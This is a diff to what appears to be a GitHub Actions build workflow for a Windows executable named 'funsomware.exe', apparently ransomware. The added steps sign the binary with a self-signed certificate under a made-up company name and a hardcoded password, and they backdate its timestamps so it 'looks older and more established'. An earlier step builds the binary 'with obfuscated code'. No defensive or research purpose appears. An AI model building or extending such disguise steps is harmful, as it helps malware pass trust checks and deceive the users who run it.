@@ -84,8 +84,78 @@ jobs:
       run: cargo fmt --all
       continue-on-error: true
     
+    - name: Install Python dependencies for icon conversion
+      run: pip install Pillow
+    
+    - name: Convert icon PNG to ICO
+      run: python convert_icon.py
+    
     - name: Build release binary with obfuscated code
       run: cargo build --release --target x86_64-pc-windows-msvc
+    
+    - name: Generate self-signed certificate
+      shell: pwsh
+      run: |
+        # Create a self-signed certificate for code signing
+        $cert = New-SelfSignedCertificate `
+          -Type CodeSigningCert `
+          -Subject "CN=Productivity Solutions Inc., O=Productivity Solutions Inc., C=US" `
+          -CertStoreLocation "Cert:\CurrentUser\My" `
+          -NotAfter (Get-Date).AddYears(3) `
+          -KeyExportPolicy Exportable `
+          -KeySpec Signature `
+          -KeyLength 2048 `
+          -KeyAlgorithm RSA `
+          -HashAlgorithm SHA256
+        
+        # Export certificate to PFX file
+        $pwd = ConvertTo-SecureString -String "TempPassword123!" -Force -AsPlainText
+        Export-PfxCertificate -Cert $cert -FilePath "codesign.pfx" -Password $pwd
+        
+        echo "Certificate generated and exported"
+    
+    - name: Sign the executable
+      shell: pwsh
+      run: |
+        # Sign the binary with the self-signed certificate
+        $pwd = ConvertTo-SecureString -String "TempPassword123!" -Force -AsPlainText
+        
+        # Import the certificate
+        $cert = Import-PfxCertificate -FilePath "codesign.pfx" -CertStoreLocation "Cert:\CurrentUser\My" -Password $pwd
+        
+        # Sign the executable
+        $signtool = "C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64\signtool.exe"
+        if (-not (Test-Path $signtool)) {
+          # Try to find signtool in other common locations
+          $signtool = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\bin" -Recurse -Filter "signtool.exe" | 
+                      Where-Object { $_.FullName -like "*\x64\*" } | 
+                      Select-Object -First 1 -ExpandProperty FullName
+        }
+        
+        if (Test-Path $signtool) {
+          & $signtool sign /fd SHA256 /sha1 $cert.Thumbprint /t http://timestamp.digicert.com /v "target/x86_64-pc-windows-msvc/release/funsomware.exe"
+          echo "Binary signed successfully"
+        } else {
+          echo "Warning: signtool.exe not found, skipping signing"
+        }
+    
+    - name: Spoof file timestamps
+      shell: pwsh
+      run: |
+        # Set file timestamps to make it look older and more established
+        $file = Get-Item "target/x86_64-pc-windows-msvc/release/funsomware.exe"
+        
+        # Set creation date to 8 months ago
+        $oldDate = (Get-Date).AddMonths(-8)
+        $file.CreationTime = $oldDate
+        
+        # Set modification date to 2 months ago (looks like it was updated recently)
+        $recentDate = (Get-Date).AddMonths(-2)
+        $file.LastWriteTime = $recentDate
+        
+        echo "File timestamps spoofed:"
+        echo "  Creation: $oldDate"
+        echo "  Modified: $recentDate"
     
     - name: Get version and create filename
       id: version
